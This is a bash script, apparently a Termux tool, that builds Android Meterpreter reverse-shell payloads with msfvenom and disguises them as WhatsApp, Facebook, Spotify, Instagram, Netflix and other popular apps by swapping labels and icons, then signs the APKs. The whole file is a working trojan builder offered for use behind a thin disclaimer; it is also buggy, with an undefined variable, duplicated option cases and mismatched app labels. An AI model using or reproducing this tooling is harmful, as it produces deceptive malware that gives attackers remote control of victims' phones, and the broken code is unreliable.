#!/bin/bash
echo ""
setterm -foreground red
echo " github/gitlab\                            /TheHorseOnFireARG"
echo ""
setterm -foreground white                                                             
echo " _|_ |_   _    ._   _.    |  _   _.  _|    _  |_   _   _ _|_ "
echo "  |_ | | (/_   |_) (_| \/ | (_) (_| (_|   (_| | | (_) _>  |_ "
echo "               |       /                   _|                "
while [ -n "$1" ]; do 

	case "$1" in

	-w) echo "" 
read -p $"lhost: " ip
read -p $"lport: " port
read -p $"decompilation name: " name
read -p $"final file name: " name2
read -p $"final file path: " finish
echo ""
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$port r > /data/data/com.termux/files/usr/share/$name.apk
cd /data/data/com.termux/files/usr/share
apktool d -f $name.apk
cd /data/data/com.termux/files/usr/share/$name
sed -i 's|<application android:label="@string/app_name">|<application android:label="@string/app_name" android:icon="@drawable/main_icon">|g' AndroidManifest.xml 
cd res
cd values 
sed -i 's|MainActivity|WhatsApp|g' strings.xml
cd ..
mkdir drawable
cd /data/data/com.termux/files/usr/share/Imagenes/WhatsApp/
cp main_icon.png /data/data/com.termux/files/usr/share/$nombre/res/drawable
sleep 5
cd /data/data/com.termux/files/usr/share
apktool b $nombre -o $name2.apk
sleep 5
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $name2.apk alias_name
jarsigner -verify -verbose -certs $name2.apk
sleep 4
rm -rf my-release-key.keystore
rm -rf $name.apk
rm -rf $name
mv $name2.apk $finish
    ;; 

	-f) echo "" 
read -p $"lhost: " ip
read -p $"lport: " port
read -p $"decompilation name: " name
read -p $"final file name: " name2
read -p $"final file path: " finish
echo ""
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$port r > /data/data/com.termux/files/usr/share/$name.apk
cd /data/data/com.termux/files/usr/share
apktool d -f $name.apk
cd /data/data/com.termux/files/usr/share/$name
sed -i 's|<application android:label="@string/app_name">|<application android:label="@string/app_name" android:icon="@drawable/main_icon">|g' AndroidManifest.xml 
cd res
cd values 
sed -i 's|MainActivity|Facebook|g' strings.xml
cd ..
mkdir drawable
cd /data/data/com.termux/files/usr/share/Imagenes/Facebook/
cp main_icon.png /data/data/com.termux/files/usr/share/$nombre/res/drawable
sleep 5
cd /data/data/com.termux/files/usr/share
apktool b $nombre -o $name2.apk
sleep 5
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $name2.apk alias_name
jarsigner -verify -verbose -certs $name2.apk
sleep 4
rm -rf my-release-key.keystore
rm -rf $name.apk
rm -rf $name
mv $name2.apk $finish
    ;; 

	-s) echo "" 
read -p $"lhost: " ip
read -p $"lport: " port
read -p $"decompilation name: " name
read -p $"final file name: " name2
read -p $"final file path: " finish
echo ""
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$port r > /data/data/com.termux/files/usr/share/$name.apk
cd /usr
apktool d -f $name.apk
cd /data/data/com.termux/files/usr/share/$name
sed -i 's|<application android:label="@string/app_name">|<application android:label="@string/app_name" android:icon="@drawable/main_icon">|g' AndroidManifest.xml 
cd res
cd values 
sed -i 's|MainActivity|Spotify|g' strings.xml
cd ..
mkdir drawable
cd /data/data/com.termux/files/usr/share/Imagenes/Spotify/
cp main_icon.png /data/data/com.termux/files/usr/share/$nombre/res/drawable
sleep 5
cd /data/data/com.termux/files/usr/share
apktool b $nombre -o $name2.apk
sleep 5
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $name2.apk alias_name
jarsigner -verify -verbose -certs $name2.apk
sleep 4
rm -rf my-release-key.keystore
rm -rf $name.apk
rm -rf $name
mv $name2.apk $finish 
    
    ;; 

    -r) echo "" 
read -p $"lhost: " ip
read -p $"lport: " port
read -p $"decompilation name: " name
read -p $"final file name: " name2
read -p $"final file path: " finish
echo ""
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$port r > /data/data/com.termux/files/usr/share/$name.apk
cd /usr
apktool d -f $name.apk
cd /data/data/com.termux/files/usr/share/$name
sed -i 's|<application android:label="@string/app_name">|<application android:label="@string/app_name" android:icon="@drawable/main_icon">|g' AndroidManifest.xml 
cd res
cd values 
sed -i 's|MainActivity|RepelisPLus|g' strings.xml
cd ..
mkdir drawable
cd /data/data/com.termux/files/usr/share/Imagenes/RepelisPLus/
cp main_icon.png /data/data/com.termux/files/usr/share/$nombre/res/drawable
sleep 5
cd /data/data/com.termux/files/usr/share/
apktool b $nombre -o $name2.apk
sleep 5
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $name2.apk alias_name
jarsigner -verify -verbose -certs $name2.apk
sleep 4
rm -rf my-release-key.keystore
rm -rf $name.apk
rm -rf $name
mv $name2.apk $finish 
    
    ;;

    -e) echo "" 
read -p $"lhost: " ip
read -p $"lport: " port
read -p $"decompilation name: " name
read -p $"final file name: " name2
read -p $"final file path: " finish
echo ""
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$port r > /data/data/com.termux/files/usr/share/$name.apk
cd /data/data/com.termux/files/usr/share/
apktool d -f $name.apk
cd /data/data/com.termux/files/usr/share/$name
sed -i 's|<application android:label="@string/app_name">|<application android:label="@string/app_name" android:icon="@drawable/main_icon">|g' AndroidManifest.xml 
cd res
cd values 
sed -i 's|MainActivity|EsFiles|g' strings.xml
cd ..
mkdir drawable
cd /data/data/com.termux/files/usr/share/Imagenes/EsFiles/
cp main_icon.png /data/data/com.termux/files/usr/share/$nombre/res/drawable
sleep 5
cd /data/data/com.termux/files/usr/share/
apktool b $nombre -o $name2.apk
sleep 5
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $name2.apk alias_name
jarsigner -verify -verbose -certs $name2.apk
sleep 4
rm -rf my-release-key.keystore
rm -rf $name.apk
rm -rf $name
mv $name2.apk $finish 
    
    ;; 

    -r) echo "" 
read -p $"lhost: " ip
read -p $"lport: " port
read -p $"decompilation name: " name
read -p $"final file name: " name2
read -p $"final file path: " finish
echo ""
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$port r > /data/data/com.termux/files/usr/share/$name.apk
cd /data/data/com.termux/files/usr/share/
apktool d -f $name.apk
cd /usr/$name
sed -i 's|<application android:label="@string/app_name">|<application android:label="@string/app_name" android:icon="@drawable/main_icon">|g' AndroidManifest.xml 
cd res
cd values 
sed -i 's|MainActivity|RepelisPLus|g' strings.xml
cd ..
mkdir drawable
cd /data/data/com.termux/files/usr/share/Imagenes/RepelisPLus/
cp main_icon.png /data/data/com.termux/files/usr/share/$nombre/res/drawable
sleep 5
cd /data/data/com.termux/files/usr/share/
apktool b $nombre -o $name2.apk
sleep 5
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $name2.apk alias_name
jarsigner -verify -verbose -certs $name2.apk
sleep 4
rm -rf my-release-key.keystore
rm -rf $name.apk
rm -rf $name
mv $name2.apk $finish    
    ;;

    -h)

    echo "
                     Information                               Options

       the payload ghost is a program to generate        < -w WhatsApp >
       msfvenom payloads but with a very curious end     < -f Facebook >
       result, since it changes its appearance           < -s Spotify >
       to look like very fashionable applications.       < -r Repelis-plus >
       <DISCLAIMER>: TheHorseOnFireARG is not            < -e Es-File >
       responsible for the misuse of this program        < -i Instagram >
       is created with the purpose of using it in        < -t Twitter >
       controlled environments.                          < -n Netflix >
                                                         < -d Dialer (call) >"

    ;;

    -i) echo "" 
read -p $"lhost: " ip
read -p $"lport: " port
read -p $"decompilation name: " name
read -p $"final file name: " name2
read -p $"final file path: " finish
echo ""
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$port r > /data/data/com.termux/files/usr/share/$name.apk
cd /data/data/com.termux/files/usr/share/
apktool d -f $name.apk
cd /data/data/com.termux/files/usr/share/$name
sed -i 's|<application android:label="@string/app_name">|<application android:label="@string/app_name" android:icon="@drawable/main_icon">|g' AndroidManifest.xml 
cd res
cd values 
sed -i 's|MainActivity|Spotify|g' strings.xml
cd ..
mkdir drawable
cd /data/data/com.termux/files/usr/share/Imagenes/Spotify/
cp main_icon.png /data/data/com.termux/files/usr/share/$nombre/res/drawable
sleep 5
cd /data/data/com.termux/files/usr/share/
apktool b $nombre -o $name2.apk
sleep 5
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $name2.apk alias_name
jarsigner -verify -verbose -certs $name2.apk
sleep 4
rm -rf my-release-key.keystore
rm -rf $name.apk
rm -rf $name
mv $name2.apk $finish 
    
    ;; 

    -r) echo "" 
read -p $"lhost: " ip
read -p $"lport: " port
read -p $"decompilation name: " name
read -p $"final file name: " name2
read -p $"final file path: " finish
echo ""
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$port r > /data/data/com.termux/files/usr/share/$name.apk
cd /data/data/com.termux/files/usr/share/
apktool d -f $name.apk
cd /data/data/com.termux/files/usr/share/$name
sed -i 's|<application android:label="@string/app_name">|<application android:label="@string/app_name" android:icon="@drawable/main_icon">|g' AndroidManifest.xml 
cd res
cd values 
sed -i 's|MainActivity|Instagram|g' strings.xml
cd ..
mkdir drawable
cd /data/data/com.termux/files/usr/share/Imagenes/Instagram/
cp main_icon.png /data/data/com.termux/files/usr/share/$nombre/res/drawable
sleep 5
cd /data/data/com.termux/files/usr/share/
apktool b $nombre -o $name2.apk
sleep 5
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $name2.apk alias_name
jarsigner -verify -verbose -certs $name2.apk
sleep 4
rm -rf my-release-key.keystore
rm -rf $name.apk
rm -rf $name
mv $name2.apk $finish 
    ;;

    -t) echo "" 
read -p $"lhost: " ip
read -p $"lport: " port
read -p $"decompilation name: " name
read -p $"final file name: " name2
read -p $"final file path: " finish
echo ""
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$port r > /data/data/com.termux/files/usr/share/$name.apk
cd /data/data/com.termux/files/usr/share/
apktool d -f $name.apk
cd /data/data/com.termux/files/usr/share/$name
sed -i 's|<application android:label="@string/app_name">|<application android:label="@string/app_name" android:icon="@drawable/main_icon">|g' AndroidManifest.xml 
cd res
cd values 
sed -i 's|MainActivity|Spotify|g' strings.xml
cd ..
mkdir drawable
cd /data/data/com.termux/files/usr/share/Imagenes/Spotify/
cp main_icon.png /data/data/com.termux/files/usr/share/$nombre/res/drawable
sleep 5
cd /data/data/com.termux/files/usr/share/
apktool b $nombre -o $name2.apk
sleep 5
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $name2.apk alias_name
jarsigner -verify -verbose -certs $name2.apk
sleep 4
rm -rf my-release-key.keystore
rm -rf $name.apk
rm -rf $name
mv $name2.apk $finish 
    
    ;; 

    -r) echo "" 
read -p $"lhost: " ip
read -p $"lport: " port
read -p $"decompilation name: " name
read -p $"final file name: " name2
read -p $"final file path: " finish
echo ""
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$port r > /data/data/com.termux/files/usr/share/$name.apk
cd /usr
apktool d -f $name.apk
cd /usr/$name
sed -i 's|<application android:label="@string/app_name">|<application android:label="@string/app_name" android:icon="@drawable/main_icon">|g' AndroidManifest.xml 
cd res
cd values 
sed -i 's|MainActivity|Twitter|g' strings.xml
cd ..
mkdir drawable
cd /bin/Imagenes/Twitter/
cp main_icon.png /usr/$nombre/res/drawable
sleep 5
cd /usr
apktool b $nombre -o $name2.apk
sleep 5
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $name2.apk alias_name
jarsigner -verify -verbose -certs $name2.apk
sleep 4
rm -rf my-release-key.keystore
rm -rf $name.apk
rm -rf $name
mv $name2.apk $finish 
    
    ;;

    -n) echo "" 
read -p $"lhost: " ip
read -p $"lport: " port
read -p $"decompilation name: " name
read -p $"final file name: " name2
read -p $"final file path: " finish
echo ""
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$port r > /usr/$name.apk
cd /usr
apktool d -f $name.apk
cd /usr/$name
sed -i 's|<application android:label="@string/app_name">|<application android:label="@string/app_name" android:icon="@drawable/main_icon">|g' AndroidManifest.xml 
cd res
cd values 
sed -i 's|MainActivity|Spotify|g' strings.xml
cd ..
mkdir drawable
cd /bin/Imagenes/Spotify/
cp main_icon.png /usr/$nombre/res/drawable
sleep 5
cd /usr
apktool b $nombre -o $name2.apk
sleep 5
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $name2.apk alias_name
jarsigner -verify -verbose -certs $name2.apk
sleep 4
rm -rf my-release-key.keystore
rm -rf $name.apk
rm -rf $name
mv $name2.apk $finish 
    
    ;; 

    -r) echo "" 
read -p $"lhost: " ip
read -p $"lport: " port
read -p $"decompilation name: " name
read -p $"final file name: " name2
read -p $"final file path: " finish
echo ""
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$port r > /usr/$name.apk
cd /usr
apktool d -f $name.apk
cd /usr/$name
sed -i 's|<application android:label="@string/app_name">|<application android:label="@string/app_name" android:icon="@drawable/main_icon">|g' AndroidManifest.xml 
cd res
cd values 
sed -i 's|MainActivity|Netflix|g' strings.xml
cd ..
mkdir drawable
cd /bin/Imagenes/Netflix/
cp main_icon.png /usr/$nombre/res/drawable
sleep 5
cd /usr
apktool b $nombre -o $name2.apk
sleep 5
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $name2.apk alias_name
jarsigner -verify -verbose -certs $name2.apk
sleep 4
rm -rf my-release-key.keystore
rm -rf $name.apk
rm -rf $name
mv $name2.apk $finish 
    
    ;;

    -d) echo "" 
read -p $"lhost: " ip
read -p $"lport: " port
read -p $"decompilation name: " name
read -p $"final file name: " name2
read -p $"final file path: " finish
echo ""
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$port r > /usr/$name.apk
cd /usr
apktool d -f $name.apk
cd /usr/$name
sed -i 's|<application android:label="@string/app_name">|<application android:label="@string/app_name" android:icon="@drawable/main_icon">|g' AndroidManifest.xml 
cd res
cd values 
sed -i 's|MainActivity|Spotify|g' strings.xml
cd ..
mkdir drawable
cd /bin/Imagenes/Spotify/
cp main_icon.png /usr/$nombre/res/drawable
sleep 5
cd /usr
apktool b $nombre -o $name2.apk
sleep 5
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $name2.apk alias_name
jarsigner -verify -verbose -certs $name2.apk
sleep 4
rm -rf my-release-key.keystore
rm -rf $name.apk
rm -rf $name
mv $name2.apk $finish 
    
    ;; 

    -r) echo "" 
read -p $"lhost: " ip
read -p $"lport: " port
read -p $"decompilation name: " name
read -p $"final file name: " name2
read -p $"final file path: " finish
echo ""
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$port r > /usr/$name.apk
cd /usr
apktool d -f $name.apk
cd /usr/$name
sed -i 's|<application android:label="@string/app_name">|<application android:label="@string/app_name" android:icon="@drawable/main_icon">|g' AndroidManifest.xml 
cd res
cd values 
sed -i 's|MainActivity|Dialer|g' strings.xml
cd ..
mkdir drawable
cd /bin/Imagenes/Dialer/
cp main_icon.png /usr/$nombre/res/drawable
sleep 5
cd /usr
apktool b $nombre -o $name2.apk
sleep 5
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $name2.apk alias_name
jarsigner -verify -verbose -certs $name2.apk
sleep 4
rm -rf my-release-key.keystore
rm -rf $name.apk
rm -rf $name
mv $name2.apk $finish 
    
    ;;

	*) echo "Option $1 not recognized" ;; 

	esac

	shift

done